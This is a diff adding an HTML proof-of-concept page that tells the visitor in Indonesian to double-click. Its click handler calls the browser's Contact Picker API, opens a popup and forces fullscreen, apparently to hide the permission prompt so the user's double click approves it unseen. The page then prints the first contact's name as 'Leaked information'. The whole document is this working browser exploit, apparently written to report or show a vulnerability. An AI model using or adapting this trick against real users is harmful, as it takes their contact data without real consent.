@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    let contacts = await navigator.contacts.select(["name"], {});
+                    document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
+                        </h1>
+                    `);
+                })();
+                
+                open("", "PoC", "_blank");
+                 try {
+                if (document.documentElement.requestFullscreen) {
+                    await document.documentElement.requestFullscreen();
+                }
+            } catch (e) {
+                console.error("Fullscreen failed:", e);
+            }   
+            }
+            
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <h1>Click dua kali</h1>
+        </center>
+    </body>
+  </body>
+</html>
